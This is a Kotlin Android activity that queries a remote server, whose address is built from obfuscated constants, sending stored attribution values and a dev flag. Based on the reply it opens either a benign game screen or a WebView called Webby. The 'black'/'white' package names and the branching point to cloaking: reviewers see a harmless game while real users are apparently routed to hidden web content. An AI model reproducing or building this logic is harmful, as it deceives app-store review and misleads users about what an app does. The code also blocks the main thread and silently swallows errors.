package com.kitkaga.blck

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.kitkaga.blck.CNST.C1
import com.kitkaga.blck.CNST.D1
import com.kitkaga.blck.CNST.DEV
import com.kitkaga.databinding.ActivityFilterBinding
import com.kitkaga.wht.Game
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class Filter : AppCompatActivity() {
    lateinit var jsoup: String
    lateinit var bindFilt: ActivityFilterBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindFilt = ActivityFilterBinding.inflate(layoutInflater)
        setContentView(bindFilt.root)

        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = coroutineTask()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()

                Log.d("jsoup status out of global scope", jsoup)
                bindFilt.txtMain.text = jsoup

                if (jsoup == CNST.jsoupCheck) {
                    Intent(applicationContext, Game::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, Webby::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }

    private suspend fun coroutineTask(): String {
        val hawk: String? = Hawk.get(C1, "null")
        val hawkAppLink: String? = Hawk.get(D1, "null")
        val hawkDevOrNot: String? = Hawk.get(DEV, "false")


        //added devModeCheck
        val forJsoupSetNaming: String = CNST.lru + CNST.odone + hawk + "&" + CNST.twoSub + hawkDevOrNot
        val forJsoupSetAppLnk: String = CNST.lru + CNST.odone + hawkAppLink + "&" +  CNST.twoSub + hawkDevOrNot

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (hawk != "null") {
                getCodeFromUrl(forJsoupSetNaming)
                Log.d("Check1C", forJsoupSetNaming)
            } else {
                getCodeFromUrl(forJsoupSetAppLnk)
                Log.d("Check1C", forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun getCodeFromUrl(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
}